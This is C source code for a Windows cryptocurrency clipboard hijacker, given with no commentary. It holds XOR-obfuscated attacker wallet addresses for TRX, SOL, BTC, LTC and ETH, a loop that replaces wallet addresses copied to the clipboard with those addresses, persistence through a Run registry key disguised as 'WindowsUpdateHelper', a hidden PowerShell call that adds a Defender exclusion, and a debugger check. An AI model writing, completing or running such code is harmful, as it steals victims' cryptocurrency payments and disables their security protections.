#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdlib.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

char s_trx[] = {
    0x54 ^ 0xA5, 0x4C ^ 0xA5, 0x45 ^ 0xA5, 0x44 ^ 0xA5, 0x4A ^ 0xA5, 0x52 ^ 0xA5, 0x41 ^ 0xA5, 0x33 ^ 0xA5,
    0x4D ^ 0xA5, 0x6B ^ 0xA5, 0x74 ^ 0xA5, 0x79 ^ 0xA5, 0x6A ^ 0xA5, 0x56 ^ 0xA5, 0x63 ^ 0xA5, 0x36 ^ 0xA5,
    0x41 ^ 0xA5, 0x58 ^ 0xA5, 0x56 ^ 0xA5, 0x64 ^ 0xA5, 0x65 ^ 0xA5, 0x75 ^ 0xA5, 0x39 ^ 0xA5, 0x73 ^ 0xA5,
    0x59 ^ 0xA5, 0x54 ^ 0xA5, 0x73 ^ 0xA5, 0x67 ^ 0xA5, 0x56 ^ 0xA5, 0x64 ^ 0xA5, 0x4E ^ 0xA5, 0x45 ^ 0xA5,
    0x6D ^ 0xA5, 0x37 ^ 0xA5, 0x00 ^ 0xA5
};

char s_sol[] = {
    0x46 ^ 0xBE, 0x34 ^ 0xBE, 0x62 ^ 0xBE, 0x64 ^ 0xBE, 0x77 ^ 0xBE, 0x44 ^ 0xBE, 0x70 ^ 0xBE, 0x74 ^ 0xBE,
    0x77 ^ 0xBE, 0x6B ^ 0xBE, 0x79 ^ 0xBE, 0x5A ^ 0xBE, 0x6A ^ 0xBE, 0x62 ^ 0xBE, 0x76 ^ 0xBE, 0x41 ^ 0xBE,
    0x57 ^ 0xBE, 0x6F ^ 0xBE, 0x47 ^ 0xBE, 0x50 ^ 0xBE, 0x63 ^ 0xBE, 0x76 ^ 0xBE, 0x34 ^ 0xBE, 0x77 ^ 0xBE,
    0x58 ^ 0xBE, 0x58 ^ 0xBE, 0x54 ^ 0xBE, 0x47 ^ 0xBE, 0x73 ^ 0xBE, 0x46 ^ 0xBE, 0x4C ^ 0xBE, 0x78 ^ 0xBE,
    0x65 ^ 0xBE, 0x72 ^ 0xBE, 0x34 ^ 0xBE, 0x37 ^ 0xBE, 0x42 ^ 0xBE, 0x46 ^ 0xBE, 0x78 ^ 0xBE, 0x45 ^ 0xBE,
    0x7A ^ 0xBE, 0x4D ^ 0xBE, 0x34 ^ 0xBE, 0x4D ^ 0xBE, 0x00 ^ 0xBE
};

char s_btc[] = {
    0x62 ^ 0xC1, 0x63 ^ 0xC1, 0x31 ^ 0xC1, 0x71 ^ 0xC1, 0x79 ^ 0xC1, 0x7A ^ 0xC1, 0x7A ^ 0xC1, 0x79 ^ 0xC1,
    0x6E ^ 0xC1, 0x79 ^ 0xC1, 0x6A ^ 0xC1, 0x70 ^ 0xC1, 0x79 ^ 0xC1, 0x6B ^ 0xC1, 0x74 ^ 0xC1, 0x35 ^ 0xC1,
    0x34 ^ 0xC1, 0x6A ^ 0xC1, 0x65 ^ 0xC1, 0x76 ^ 0xC1, 0x33 ^ 0xC1, 0x67 ^ 0xC1, 0x61 ^ 0xC1, 0x65 ^ 0xC1,
    0x33 ^ 0xC1, 0x6B ^ 0xC1, 0x35 ^ 0xC1, 0x63 ^ 0xC1, 0x35 ^ 0xC1, 0x6B ^ 0xC1, 0x71 ^ 0xC1, 0x6E ^ 0xC1,
    0x73 ^ 0xC1, 0x6C ^ 0xC1, 0x70 ^ 0xC1, 0x63 ^ 0xC1, 0x73 ^ 0xC1, 0x6D ^ 0xC1, 0x61 ^ 0xC1, 0x37 ^ 0xC1,
    0x6C ^ 0xC1, 0x6B ^ 0xC1, 0x00 ^ 0xC1
};

char s_ltc[] = {
    0x6C ^ 0xAB, 0x74 ^ 0xAB, 0x63 ^ 0xAB, 0x31 ^ 0xAB, 0x71 ^ 0xAB, 0x6C ^ 0xAB, 0x30 ^ 0xAB, 0x71 ^ 0xAB,
    0x7A ^ 0xAB, 0x32 ^ 0xAB, 0x6A ^ 0xAB, 0x73 ^ 0xAB, 0x6C ^ 0xAB, 0x35 ^ 0xAB, 0x63 ^ 0xAB, 0x38 ^ 0xAB,
    0x67 ^ 0xAB, 0x6D ^ 0xAB, 0x6E ^ 0xAB, 0x6D ^ 0xAB, 0x6B ^ 0xAB, 0x38 ^ 0xAB, 0x30 ^ 0xAB, 0x36 ^ 0xAB,
    0x65 ^ 0xAB, 0x30 ^ 0xAB, 0x77 ^ 0xAB, 0x34 ^ 0xAB, 0x78 ^ 0xAB, 0x6C ^ 0xAB, 0x34 ^ 0xAB, 0x68 ^ 0xAB,
    0x30 ^ 0xAB, 0x70 ^ 0xAB, 0x32 ^ 0xAB, 0x6B ^ 0xAB, 0x79 ^ 0xAB, 0x34 ^ 0xAB, 0x36 ^ 0xAB, 0x73 ^ 0xAB,
    0x67 ^ 0xAB, 0x6B ^ 0xAB, 0x68 ^ 0xAB, 0x00 ^ 0xAB
};

char s_eth[] = {
    0x30 ^ 0xE7, 0x78 ^ 0xE7, 0x63 ^ 0xE7, 0x33 ^ 0xE7, 0x37 ^ 0xE7, 0x39 ^ 0xE7, 0x34 ^ 0xE7, 0x32 ^ 0xE7,
    0x35 ^ 0xE7, 0x34 ^ 0xE7, 0x43 ^ 0xE7, 0x35 ^ 0xE7, 0x37 ^ 0xE7, 0x34 ^ 0xE7, 0x63 ^ 0xE7, 0x35 ^ 0xE7,
    0x45 ^ 0xE7, 0x30 ^ 0xE7, 0x44 ^ 0xE7, 0x31 ^ 0xE7, 0x39 ^ 0xE7, 0x36 ^ 0xE7, 0x38 ^ 0xE7, 0x30 ^ 0xE7,
    0x39 ^ 0xE7, 0x45 ^ 0xE7, 0x43 ^ 0xE7, 0x31 ^ 0xE7, 0x42 ^ 0xE7, 0x61 ^ 0xE7, 0x39 ^ 0xE7, 0x36 ^ 0xE7,
    0x33 ^ 0xE7, 0x64 ^ 0xE7, 0x37 ^ 0xE7, 0x33 ^ 0xE7, 0x33 ^ 0xE7, 0x38 ^ 0xE7, 0x30 ^ 0xE7, 0x36 ^ 0xE7,
    0x38 ^ 0xE7, 0x30 ^ 0xE7, 0x00 ^ 0xE7
};

void oafasfJJh(char* str, unsigned char key) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= key;
    }
}

BOOL afafW3czz(const char* str) {
    if (!str) return FALSE;
    size_t len = strlen(str);
    if (len == 34 && str[0] == 'T') return TRUE;
    if (len == 44) {
        for (int i = 0; i < 44; i++) {
            if (!isalnum((unsigned char)str[i])) return FALSE;
        }
        return TRUE;
    }
    if (strncmp(str, "bc1", 3) == 0 || strncmp(str, "ltc1", 4) == 0) return TRUE;
    if (len == 42 && str[0] == '0' && str[1] == 'x') {
        for (int i = 2; i < 42; i++) {
            if (!isxdigit((unsigned char)str[i])) return FALSE;
        }
        return TRUE;
    }
    return FALSE;
}

void hvci9YT() {
    HKEY hKey;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
            (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void caiASAFDAHJI() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    PathRemoveFileSpecW(path);

    wchar_t cmd[512];
    swprintf(cmd, 512,
        L"powershell -WindowStyle Hidden -Command \"Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath \\\"%s\\\"'\"",
        path);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void annn7HD1QZ() {
    volatile char dummy[] = { 0xAA, 0xBB, 0xCC, 0xDD };
    for (int i = 0; i < sizeof(dummy); i++) {
        dummy[i] ^= 0x55;
    }
}

void jbnJ23R9qw() {
    if (IsDebuggerPresent()) {
        ExitProcess(11);
    }

    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* clip = (wchar_t*)GlobalLock(hData);
            char buf[128];
            WideCharToMultiByte(CP_UTF8, 0, clip, -1, buf, sizeof(buf), 0, 0);

            if (afafW3czz(buf)) {
                oafasfJJh(s_trx, 0xA5);
                oafasfJJh(s_sol, 0xBE);
                oafasfJJh(s_btc, 0xC1);
                oafasfJJh(s_ltc, 0xAB);
                oafasfJJh(s_eth, 0xE7);

                const char* replacement = NULL;
                if (buf[0] == 'T') replacement = s_trx;
                else if (buf[0] == 'F') replacement = s_sol;
                else if (strncmp(buf, "bc1", 3) == 0) replacement = s_btc;
                else if (strncmp(buf, "ltc1", 4) == 0) replacement = s_ltc;
                else if (strncmp(buf, "0x", 2) == 0) replacement = s_eth;

                if (replacement) {
                    wchar_t wrep[128];
                    MultiByteToWideChar(CP_UTF8, 0, replacement, -1, wrep, 128);
                    HGLOBAL hNew = GlobalAlloc(GMEM_MOVEABLE, (wcslen(wrep) + 1) * 2);
                    wchar_t* locked = (wchar_t*)GlobalLock(hNew);
                    wcscpy(locked, wrep);
                    GlobalUnlock(hNew);
                    EmptyClipboard();
                    SetClipboardData(CF_UNICODETEXT, hNew);
                }

                oafasfJJh(s_trx, 0xA5);
                oafasfJJh(s_sol, 0xBE);
                oafasfJJh(s_btc, 0xC1);
                oafasfJJh(s_ltc, 0xAB);
                oafasfJJh(s_eth, 0xE7);
            }
            GlobalUnlock(hData);
        }
        CloseClipboard();
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {

    FreeConsole();
    caiASAFDAHJI();
    hvci9YT();

    DWORD oldProtect;
    VirtualProtect((LPVOID)annn7HD1QZ, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
    annn7HD1QZ();

    while (1) {
        jbnJ23R9qw();
        Sleep(300 + (GetTickCount() % 700));
    }
    return 0;
}
